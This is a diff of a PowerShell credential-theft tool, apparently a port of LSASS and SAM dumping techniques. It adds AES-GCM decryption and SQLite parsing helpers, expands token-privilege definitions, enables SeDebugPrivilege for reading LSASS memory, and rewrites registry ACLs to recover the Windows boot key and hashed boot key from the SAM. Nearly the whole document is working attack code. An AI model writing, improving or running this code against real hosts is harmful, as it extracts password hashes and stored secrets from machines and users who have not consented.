@@ -6,7 +6,9 @@
 <#########################################################################################################>
 <#########################################################################################################>
 
+<########################>
 <### Common functions ###>
+<########################>
 
 <#
 	On older PS Version BigInteger type doesn't exist
@@ -391,7 +393,7 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
+        Write-Host "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
         return $Null
     }
 
@@ -403,7 +405,7 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to derive key : $HexCode"
+        Write-Host "Failed to derive key : $HexCode"
         return $Null
     }
 
@@ -411,14 +413,16 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to close algorithm provider : $HexCode"
+        Write-Host "Failed to close algorithm provider : $HexCode"
         return $Null
     }
 
     return [byte[]]($Key[0..31])
 }
 
-<### DPAPI Crypto constants ###>
+<#######################>
+<### DPAPI functions ###>
+<#######################>
 
 function LoadCryptoConstants
 {
@@ -581,7 +585,391 @@ function LoadCryptoConstants
 	$Global:FLAGS["CRYPTPROTECT_SYSTEM"] = 0x20000000
 }
 
+<#
+	AES 256 GCM Decryption with BCrypt and CNG
+	Thanks to https://github.com/dvsekhvalnov/jose-jwt/blob/master/jose-jwt/crypto/AesGcm.cs
+#>
+function LoadAESGCMDecrypt()
+{
+	If (-not ([System.Management.Automation.PSTypeName]'BCryptInterop').Type)
+	{
+		Add-Type -IgnoreWarnings @"
+		using System;
+		using System.Runtime.InteropServices;
+		using System.Security.Cryptography;
+		using System.Text;
+		using System.Linq;
+
+		public class BCryptInterop
+		{
+			public const uint ERROR_SUCCESS = 0x00000000;
+
+			public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);
+
+			public const string BCRYPT_OBJECT_LENGTH = "ObjectLength";
+			public const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
+			public const string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
+			public const string BCRYPT_CHAINING_MODE = "ChainingMode";
+			public const string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
+			public const string BCRYPT_AES_ALGORITHM = "AES";
+
+			public const string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";
+
+			public const int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;
+
+			public const uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;
+
+			[StructLayout(LayoutKind.Sequential)]
+			public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
+			{
+				public int cbSize;
+				public int dwInfoVersion;
+				public IntPtr pbNonce;
+				public int cbNonce;
+				public IntPtr pbAuthData;
+				public int cbAuthData;
+				public IntPtr pbTag;
+				public int cbTag;
+				public IntPtr pbMacContext;
+				public int cbMacContext;
+				public int cbAAD;
+				public long cbData;
+				public int dwFlags;
+
+				public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
+				{
+					dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
+					cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
+
+					if (iv != null)
+					{
+						cbNonce = iv.Length;
+						pbNonce = Marshal.AllocHGlobal(cbNonce);
+						Marshal.Copy(iv, 0, pbNonce, cbNonce);
+					}
+
+					if (aad != null)
+					{
+						cbAuthData = aad.Length;
+						pbAuthData = Marshal.AllocHGlobal(cbAuthData);
+						Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
+					}
+
+					if (tag != null)
+					{
+						cbTag = tag.Length;
+						pbTag = Marshal.AllocHGlobal(cbTag);
+						Marshal.Copy(tag, 0, pbTag, cbTag);
+
+						cbMacContext = tag.Length;
+						pbMacContext = Marshal.AllocHGlobal(cbMacContext);
+					}
+				}
+
+				public void Dispose()
+				{
+					if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
+					if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
+					if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
+					if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
+				}
+			}
+
+			[DllImport("bcrypt.dll")]
+			public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
+																[MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
+																[MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
+																uint dwFlags);
+			[DllImport("bcrypt.dll")]
+			public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);
+			[DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
+			public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);
+			[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
+			internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
+			[DllImport("bcrypt.dll")]
+			public static extern uint BCryptImportKey(IntPtr hAlgorithm,
+													IntPtr hImportKey,
+													[MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
+													out IntPtr phKey,
+													IntPtr pbKeyObject,
+													int cbKeyObject,
+													byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
+													int cbInput,
+													uint dwFlags);
+			[DllImport("bcrypt.dll")]
+			public static extern uint BCryptDestroyKey(IntPtr hKey);
+			[DllImport("bcrypt.dll")]
+			internal static extern uint BCryptDecrypt(IntPtr hKey,
+													byte[] pbInput,
+													int cbInput,
+													ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
+													byte[] pbIV,
+													int cbIV,
+													byte[] pbOutput,
+													int cbOutput,
+													ref int pcbResult,
+													int dwFlags);
+
+			public static byte[] AESGCMDecrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
+			{
+				IntPtr hAlg = OpenAlgorithmProvider(BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, BCRYPT_CHAIN_MODE_GCM);
+				IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);
+
+				byte[] plainText;
+
+				var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
+				using (authInfo)
+				{
+					byte[] ivData = new byte[MaxAuthTagSize(hAlg)];
+
+					int plainTextSize = 0;
+
+					uint status = BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);
+
+					if (status != ERROR_SUCCESS)
+						throw new CryptographicException(string.Format("[-] BCryptDecrypt() for getting buffer size failed with error code {0}", status));
+
+					plainText = new byte[plainTextSize];
+
+					status = BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);
+
+					if (status == STATUS_AUTH_TAG_MISMATCH)
+						throw new CryptographicException("[-] BCryptDecrypt() authentication tag mismatch");
+
+					if (status != ERROR_SUCCESS)
+						throw new CryptographicException(string.Format("[-] BCryptDecrypt() failed with error code {0}", status));
+				}
+
+				BCryptDestroyKey(hKey);
+				Marshal.FreeHGlobal(keyDataBuffer);
+				BCryptCloseAlgorithmProvider(hAlg, 0x0);
+
+				return plainText;
+			}
+
+			public static int MaxAuthTagSize(IntPtr hAlg)
+			{
+				byte[] tagLengthsValue = GetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH);
+
+				return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
+			}
+
+			public static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
+			{
+				IntPtr hAlg = IntPtr.Zero;
+
+				uint status = BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);
+
+				if (status != ERROR_SUCCESS)
+					throw new CryptographicException(string.Format("[-] BCryptOpenAlgorithmProvider() failed with error code {0}", status));
+
+				byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
+				status = BCryptSetAlgorithmProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);
+
+				if (status != ERROR_SUCCESS)
+					throw new CryptographicException(string.Format("[-] BCryptSetAlgorithmProperty(BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM) failed with error code {0}", status));
+
+				return hAlg;
+			}
+
+			public static IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
+			{
+				byte[] objLength = GetProperty(hAlg, BCRYPT_OBJECT_LENGTH);
+
+				int keyDataSize = BitConverter.ToInt32(objLength, 0);
+
+				IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);
+
+				byte[] keyBlob = BCRYPT_KEY_DATA_BLOB_MAGIC.Concat(BitConverter.GetBytes(0x1)).Concat(BitConverter.GetBytes(key.Length)).Concat(key).ToArray();
+
+				uint status = BCryptImportKey(hAlg, IntPtr.Zero, BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);
+
+				if (status != ERROR_SUCCESS)
+					throw new CryptographicException(string.Format("[-] BCryptImportKey() failed with error code {0}", status));
+
+				return keyDataBuffer;
+			}
+
+			public static byte[] GetProperty(IntPtr hAlg, string name)
+			{
+				int size = 0;
+
+				uint status = BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);
+
+				if (status != ERROR_SUCCESS)
+					throw new CryptographicException(string.Format("[-] BCryptGetProperty() for getting buffer size failed with error code {0}", status));
+
+				byte[] value = new byte[size];
+
+				status = BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);
+
+				if (status != ERROR_SUCCESS)
+					throw new CryptographicException(string.Format("[-] BCryptGetProperty() failed with error code {0}", status));
+
+				return value;
+			}
+		}
+"@
+	}
+}
+
+<#
+	SQLite File Parser
+	Thanks to https://stackoverflow.com/questions/76488519/sqlite-querying-using-embedded-c-sharp
+#>
+function LoadSQLite()
+{
+	If (-not ([System.Management.Automation.PSTypeName]'SqliteHelper').Type)
+	{
+		$libName = ('sqlite3', 'winsqlite3.dll')[$env:OS -eq 'Windows_NT']
+		Add-Type -ReferencedAssemblies System.Collections, System.Data, System.Data.Common, System.Xml -TypeDefinition @"
+		using System;
+		using System.Data;
+		using System.Collections.Generic;
+		using System.Runtime.InteropServices;
+
+		public static class SqliteHelper
+		{
+			[DllImport("$libName", CharSet=CharSet.Unicode, EntryPoint="sqlite3_open16")]            private static extern int    open(string filename, out IntPtr db);
+			[DllImport("$libName", EntryPoint="sqlite3_extended_result_codes")]                      private static extern int    result_codes(IntPtr db, int onOrOff);
+			[DllImport("$libName", EntryPoint="sqlite3_close_v2")]                                   private static extern int    close(IntPtr db);
+			[DllImport("$libName", CharSet=CharSet.Unicode, EntryPoint="sqlite3_prepare16")]         private static extern int    prepare(IntPtr db, string query, int len, out IntPtr stmt, IntPtr dummy);
+			[DllImport("$libName", EntryPoint="sqlite3_step")]                                       private static extern int    step(IntPtr stmt);
+			[DllImport("$libName", EntryPoint="sqlite3_column_count")]                               private static extern int    column_count( IntPtr stmt);
+			[DllImport("$libName", EntryPoint="sqlite3_column_name16")]                              private static extern IntPtr column_name(  IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_type")]                                private static extern int    column_type(  IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_double")]                              private static extern Double column_double(IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_int")]                                 private static extern int    column_int(   IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_int64")]                               private static extern Int64  column_int64( IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_text16")]                              private static extern IntPtr column_text(  IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_blob")]                                private static extern IntPtr column_blob(  IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_column_bytes")]                               private static extern int    column_bytes( IntPtr stmt, int col);
+			[DllImport("$libName", EntryPoint="sqlite3_finalize")]                                   private static extern int    finalize(IntPtr stmt);
+
+			// Important result codes
+			private const int SQLITE_OK = 0; 
+			private const int SQLITE_ROW = 100; // step() indicates that at least 1 more row exists.
+			private const int SQLITE_DONE = 101; // step() indicates that there are no (more) rows.
+			// Data type IDs
+			private const int SQLITE_INTEGER = 1;
+			private const int SQLITE_FLOAT = 2;
+			private const int SQLITE_TEXT = 3;
+			private const int SQLITE_BLOB = 4;
+			private const int SQLITE_NULL = 5;
+
+			// A helper exception to report SQLite result codes that are errors
+			public class SqliteException : Exception
+			{
+				private int _nativeErrorCode; 
+				public int NativeErrorCode { get { return _nativeErrorCode; } set { _nativeErrorCode = value; } }
+				public SqliteException(int code) : this(String.Format("SQLite API call failed with result code {0}.", code), code) {}
+				public SqliteException(string message, int code) : base(message) { NativeErrorCode = code; }
+			}
+
+			public static IntPtr Open(string filename)
+			{
+				IntPtr db;
+				int result = open(filename, out db);
+				if (result != SQLITE_OK) throw new SqliteException(result);
+				result = result_codes(db, 1); // report extended result codes by default
+				if (result != SQLITE_OK) throw new SqliteException(result);
+				return db;
+			}
+
+			public static void Close(IntPtr db)
+			{
+				int result = close(db);
+				if (result != SQLITE_OK) throw new SqliteException(result);
+			}
+
+			public static DataTable Execute(IntPtr db, string query)
+			{
+				IntPtr stmt;
+				DataTable dt = new DataTable();
+
+				int result = prepare(db, query, -1, out stmt, IntPtr.Zero);
+				if (result != SQLITE_OK) throw new SqliteException(result);
+
+				int colCount = column_count(stmt);
+
+				// Get the first row so that column namescan be determined.
+				result = step(stmt);
+				if (result == SQLITE_ROW)
+				{
+					// Add corresponding columns to the data-table object.
+					// NOTE: Since any column value can be NULL, we cannot infer fixed data
+					//       types for the columns and therefore *must* use typeof(object).
+					for (int c = 0; c < colCount; c++)
+					{
+						dt.Columns.Add(Marshal.PtrToStringUni(column_name(stmt, c)), typeof(object));
+					}
+				}
+				else if (result == SQLITE_DONE)
+				{ // Either a query without results or a non-query statement.
+					result = finalize(stmt);
+					if (result != 0) throw new SqliteException(result);
+					// For simplicity, return an empty DataTable instance either way.
+					// In a PowerShell pipeline, its .Rows collection is automatically enumerated,
+					// meaning that *no* objects are sent through the pipeline.
+					// If a non-query's output isn't captured (which shouldn't be necessary), PowerShell's automatic enumeration
+					// in the pipeline ensures that *no* output stream pollution occurs.
+					return dt;
+				}
+				else
+				{
+					throw new SqliteException(result);
+				}
+
+				// Fetch all rows and populate a DataTable instance with them.
+				object[] rowData = new object[colCount];
+				do
+				{
+					for (int i = 0; i < colCount; i++)
+					{
+						// Note: The column types must be determined for each and every row,
+						//       given that NULL values may be present.
+						switch (column_type(stmt, i))
+						{
+							case SQLITE_INTEGER: // covers all integer types up to System.Int64
+							rowData[i] = column_int64(stmt, i);
+							break;
+							case SQLITE_FLOAT:
+							rowData[i] = column_double(stmt, i);
+							break;
+							case SQLITE_TEXT:
+							rowData[i] = Marshal.PtrToStringUni(column_text(stmt, i));
+							break;
+							case SQLITE_BLOB:
+							IntPtr ptr = column_blob(stmt, i);
+							int len = column_bytes(stmt, i);
+							byte[] arr = new byte[len];
+							Marshal.Copy(ptr, arr, 0, len);
+							rowData[i] = arr;
+							break;
+							case SQLITE_NULL: 
+							rowData[i] = DBNull.Value;
+							break;
+							default:
+							throw new Exception(String.Format("DESIGN ERROR: Unexpected column-type ID: {0}", column_type(stmt, i)));
+						}
+					}
+					
+					dt.Rows.Add(rowData);
+				} while (step(stmt) == SQLITE_ROW);
+
+				result = finalize(stmt);
+				if (result != SQLITE_OK) throw new SqliteException(result);
+
+				return dt;
+			}
+		}
+"@
+	}
+}
+
+<######################################>
 <### Registry Windows API functions ###>
+<######################################>
 
 function LoadRegAPI
 {
@@ -620,7 +1008,7 @@ function Get-RegKeyClass($Key, $SubKey)
 		"HKU"  { $nKey = 0x80000003} # HK Users
 		"HKCC" { $nKey = 0x80000005} # HK Current Config
 		default {
-			Write-Error "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
+			Write-Host "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
 			return $Null
 		}
 	}
@@ -639,13 +1027,13 @@ function Get-RegKeyClass($Key, $SubKey)
 		}
 		Else
 		{
-			Write-Error "RegQueryInfoKey() failed"
+			Write-Host "RegQueryInfoKey() failed"
 			return $Null
 		}
 	}
 	Else
 	{
-		Write-Error "RegOpenKeyEx() failed"
+		Write-Host "RegOpenKeyEx() failed"
 		return $Null
 	}
 }
@@ -684,24 +1072,26 @@ function Get-RegKeyPropertyValue($Key, $SubKey, $Property)
 			}
 			Else
 			{
-				Write-Error "RegQueryValueEx() failed to retrieve value"
+				Write-Host "RegQueryValueEx() failed to Recover value"
 				return $Null
 			}
 		}
 		Else
 		{
-			Write-Error "RegQueryValueEx() failed to compute value length"
+			Write-Host "RegQueryValueEx() failed to compute value length"
 			return $Null
 		}
 	}
 	Else
 	{
-		Write-Error "RegOpenKeyEx() failed"
+		Write-Host "RegOpenKeyEx() failed"
 		return $Null
 	}
 }
 
+<#######################>
 <### LSASS functions ###>
+<########################>
 
 <#
 	GetNativeSystemInfo() Windows API function
@@ -762,9 +1152,9 @@ function GetSystemInfo()
 
 function EnablePrivilege($Privilege)
 {
-	# Enable desired privilege. Require admin rights
+	# Enable desired privilege
 	# Add Win API functions: AdjustTokenPrivileges()/OpenProcessToken()/LookupPrivilegeValue()
-	# A New function is define to set privilege on process: SetPrivilege()
+	# A new function is define to set privilege on process: SetPrivilege()
 	If (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type)
 	{
 		Add-Type -TypeDefinition @'
@@ -783,6 +1173,9 @@ function EnablePrivilege($Privilege)
 
 			[DllImport("advapi32.dll", SetLastError = true)]
 			internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+
+			[DllImport("Kernel32.dll")]
+			public static extern uint GetLastError();
 
 			[StructLayout(LayoutKind.Sequential, Pack = 1)]
 			internal struct TokPriv1Luid
@@ -829,12 +1222,12 @@ function EnablePrivilege($Privilege)
 
 	$ProcHandle = (Get-Process -id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
 	$PrivilegeEnabled = [WinPriv]::SetPrivilege($ProcHandle, $Privilege, $False)
-	If (-not $PrivilegeEnabled)
-	{
-		return $False
-	}
 
-	return $True
+	# From Microsoft: "If the function succeeds, the return value is nonzero. To determine whether the function adjusted all of the specified privileges, call GetLastError, which returns one of the following values when the function succeeds:"
+	# ERROR_SUCCESS = 0 = The function adjusted all specified privileges
+	# ERROR_NOT_ALL_ASSIGNED = 1300 = The token does not have one or more of the privileges specified in the NewState parameter. The function may succeed with this error value even if no privileges were adjusted. The PreviousState parameter indicates the privileges that were adjusted
+	# https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
+	return ([WinPriv]::GetLastError())
 }
 
 <#
@@ -856,7 +1249,14 @@ function SetupBeforeDumping()
 		return $False
 	}
 
-	return (EnablePrivilege "SeDebugPrivilege")
+	$RetCode = EnablePrivilege "SeDebugPrivilege"
+	If ($RetCode -ne 0)
+	{
+		Write-Host ("[-] Failed to enable SeDebugPrivilege with error {0}" -f ($RetCode))
+		return $False
+	}
+
+	return $True
 }
 
 <#
@@ -865,7 +1265,7 @@ function SetupBeforeDumping()
 function LoadWinProcAPI
 {
 	# OpenProcess()/VirtualQueryEx()/CloseHandle()/EnumProcessModules()/GetModuleFileNameEx()/GetModuleInformation()
-	# DuplicateHandle()/GetCurrentProcess()/GetProcessImageFileName()/NtQuerySystemInformation()/NtQueryObject()
+	# DuplicateHandle()/GetCurrentProcess()/GetProcessImageFileName()/NtQuerySystemInformation()/NtQueryObject()/GetLastError()
 	If (-not ([System.Management.Automation.PSTypeName]'WinProcAPI').Type)
 	{
 		Add-Type -TypeDefinition @'
@@ -1017,6 +1417,8 @@ function LoadWinProcAPI
 			public static extern IntPtr GetCurrentProcess();
 			[DllImport("kernel32.dll", SetLastError = true)]
 			public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref uint lpNumberOfBytesRead);
+			[DllImport("Kernel32.dll")]
+			public static extern uint GetLastError();
 
 			[DllImport("ntdll.dll")]
 			public static extern uint NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);
@@ -1037,7 +1439,7 @@ function LoadWinProcAPI
 }
 
 <#
-	Find indexes of "search" into "bytes"
+	Find indexes of search into bytes
 #>
 function Find-Bytes($Bytes, $Search, $Start, $All)
 {
@@ -1080,16 +1482,16 @@ function ReadMemory($Handle, $Pages, $Addr)
 				$BuffLen = $Page["RegionSize"] + 100
 				$Buff = New-Object byte[] $BuffLen
 				$BytesRead = $Null
-				$Res = [WinProcAPI]::ReadProcessMemory($Handle, $Page["BaseAddress"], $Buff, $Page["RegionSize"], [ref] $BytesRead)
+				$Res = [WinProcAPI]::ReadProcessMemory($Handle, $Page["BaseAddress"], $Buff, $Page["RegionSize"], [ref]$BytesRead)
 				If (-not $Res)
 				{
-					Write-Host ("[-] Failed to read page. Try again")
-					return (ReadMemory $Handle $Pages $Addr)
+					Write-Host ("[-] Failed to read page with error {0}`n" -f ([WinProcAPI]::GetLastError()))
+					Exit
 				}
 				ElseIf ($BytesRead -ne $Page["RegionSize"])
 				{
-					Write-Host ("[-] Failed to read entire page region size")
-					return $Null
+					Write-Host ("[-] Failed to read entire page region size with error {0}`n" -f ([WinProcAPI]::GetLastError()))
+					Exit
 				}
 				Else
 				{
@@ -1109,12 +1511,13 @@ function ReadMemory($Handle, $Pages, $Addr)
 }
 
 <#
-	Retrieve indexes into buff where signature found at address
+	Recover indexes into buff where signature found at address
 	Return the buffer and indexes
 #>
 function SearchMemory($Handle, $Pages, $Address, $Signature)
 {
 	$Buff, $OffBuff, $BaseAddress = ReadMemory $Handle $Pages $Address
+
 	If ($Buff)
 	{
 		$SigIndexes = Find-Bytes $Buff $Signature 0 $True
@@ -1147,7 +1550,7 @@ function AlignAddress($BaseAddr, $OffBuf, $Alignment)
 
 <#
 	Return the desired type into the buffer starting at offset
-	The type can be a structure and It will be set inside Struct parameter
+	The type can be a structure and It will be set inside struct parameter
 #>
 function GetType($Buff, $BaseAddr, [ref]$Offset, $Type, $Struct)
 {
@@ -1395,7 +1798,9 @@ function Walk-List($Decryptor, $Handle, $Pages, $Pointer, $PointerLoc, $Callback
 	}
 }
 
+<########################>
 <### Tokens functions ###>
+<########################>
 
 function LoadTokensAPI
 {
@@ -1443,7 +1848,39 @@ function LoadTokensAPI
 				TokenSessionReference,
 				TokenSandBoxInert,
 				TokenAuditPolicy,
-				TokenOrigin
+				TokenOrigin,
+				TokenElevationType,
+				TokenLinkedToken,
+				TokenElevation,
+				TokenHasRestrictions,
+				TokenAccessInformation,
+				TokenVirtualizationAllowed,
+				TokenVirtualizationEnabled,
+				TokenIntegrityLevel,
+				TokenUIAccess,
+				TokenMandatoryPolicy,
+				TokenLogonSid,
+				TokenIsAppContainer,
+				TokenCapabilities,
+				TokenAppContainerSid,
+				TokenAppContainerNumber,
+				TokenUserClaimAttributes,
+				TokenDeviceClaimAttributes,
+				TokenRestrictedUserClaimAttributes,
+				TokenRestrictedDeviceClaimAttributes,
+				TokenDeviceGroups,
+				TokenRestrictedDeviceGroups,
+				TokenSecurityAttributes,
+				TokenIsRestricted,
+				TokenProcessTrustLevel,
+				TokenPrivateNameSpace,
+				TokenSingletonAttributes,
+				TokenBnoIsolation,
+				TokenChildProcessFlags,
+				TokenIsLessPrivilegedAppContainer,
+				TokenIsSandboxed,
+				TokenIsAppSilo,
+				MaxTokenInfoClass
 			}
 
 			[StructLayout(LayoutKind.Sequential)]
@@ -1484,7 +1921,6 @@ function LoadTokensAPI
 			[StructLayout(LayoutKind.Sequential)]
 			public struct SID_AND_ATTRIBUTES
 			{
-
 				public IntPtr Sid;
 				public int Attributes;
 			}
@@ -1547,10 +1983,24 @@ function LoadTokensAPI
 			}
 
 			[Flags]
+			public enum TOKEN_ELEVATION_TYPE : uint
+			{
+				TokenElevationTypeDefault = 1,
+				TokenElevationTypeFull,
+				TokenElevationTypeLimited
+			}
+
+			[Flags]
 			public enum TOKEN_TYPE : uint
 			{
 				TokenPrimary		= 1,
 				TokenImpersonation  = 2
+			}
+
+			[StructLayout(LayoutKind.Sequential)]
+			public struct TOKEN_ELEVATION
+			{
+				public UInt32 TokenIsElevated;
 			}
 
 			[Flags]
@@ -1676,6 +2126,21 @@ function LoadTokensAPI
 				public LARGE_INTEGER PasswordMustChange;
 			}
 
+			[StructLayout(LayoutKind.Sequential)]
+			public struct LUID_AND_ATTRIBUTES
+			{
+				public LUID Luid;
+				public UInt32 Attributes;
+			}
+
+			public struct TOKEN_PRIVILEGES
+			{
+				public UInt32 PrivilegeCount;
+				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1000)]
+				public LUID_AND_ATTRIBUTES[] Privileges;
+			}
+
+			public const UInt32 ERROR_BAD_LENGTH = 24;
 			public const UInt32 ERROR_INSUFFICIENT_BUFFER = 122;
 			public const UInt32 ERROR_INVALID_SID = 1337;
 
@@ -1717,6 +2182,12 @@ function LoadTokensAPI
 			public static extern bool CreateWellKnownSid(uint WellKnownSidType, IntPtr DomainSid, IntPtr pSid, ref uint cbSid);
 			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
 			public static extern uint SetEntriesInAclW(uint cCountOfExplicitEntries, ref EXPLICIT_ACCESS pListOfExplicitEntries, IntPtr OldAcl, ref IntPtr NewAcl);
+			[DllImport("advapi32.dll", SetLastError = true)]
+			[return: MarshalAs(UnmanagedType.Bool)]
+			public static extern bool LookupPrivilegeName(string lpSystemName, ref LUID lpLuid, System.Text.StringBuilder lpName, ref uint cchName);
+			[DllImport("advapi32.dll", SetLastError = true)]
+			[return: MarshalAs(UnmanagedType.Bool)]
+			public static extern bool PrivilegeCheck(IntPtr ClientToken, ref TOKEN_PRIVILEGES RequiredPrivileges, out bool pfResult);
 
 			[DllImport("User32.dll")]
 			public static extern IntPtr OpenWindowStationW(IntPtr lpszWinSta, bool fInherit, uint dwDesiredAccess);
@@ -1762,7 +2233,14 @@ function Get-BootKey
 			2- Apply permutations with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
 	#>
 
-	Write-Host "`n[===] Retrieve Boot Key (or SysKey) [===]"
+	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+	{
+		Write-Host ("[ERROR] Script must be run with administrator privileges. Exit`n")
+		Exit
+	}
+
+	Write-Host "[===] Recover Boot Key (or SysKey) [===]"
 
 	# Set full control for registry "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Lsa', 'ReadWriteSubTree', 'ChangePermissions')
@@ -1782,7 +2260,7 @@ function Get-BootKey
 
 	# And we have the BootKey (or SysKey)
 	$HexBootKey = [System.BitConverter]::ToString($BootKey).Replace("-", "")
-	Write-Host ("[+] Boot Key = {0}" -f ($HexBootKey))
+	Write-Host ("[+] Boot Key = {0}`n" -f ($HexBootKey))
 
 	# Remove ACL
 	$Removed = $ACL.RemoveAccessRule($Rule)
@@ -1806,7 +2284,7 @@ function Get-HBootKey($BootKey)
 					- Hashed BootKey = AESDecrypt (BootKey, Data)
 	#>
 
-	Write-Host "`n[===] Compute Hashed Boot Key [===]"
+	Write-Host "[===] Compute Hashed Boot Key [===]"
 
 	$AQWERTY = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
 	$ANUM = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
@@ -1823,7 +2301,7 @@ function Get-HBootKey($BootKey)
 
 	If (-not $K)
 	{
-		Write-Error "Unable to retrieve registry 'HKLM:\SAM\SAM\Domains\Account'"
+		Write-Host ("[-] Unable to Recover registry 'HKLM:\SAM\SAM\Domains\Account'`n")
 		return $Null
 	}
 
@@ -1831,7 +2309,7 @@ function Get-HBootKey($BootKey)
 	$DOMAIN_ACCOUNT_F = $K.GetValue("F")
 	If (-not $DOMAIN_ACCOUNT_F)
 	{
-		Write-Error "Unable to retrieve key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'"
+		Write-Host ("[-] Unable to Recover key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'`n")
 		return $Null
 	}
 
@@ -1887,11 +2365,11 @@ function Get-HBootKey($BootKey)
 
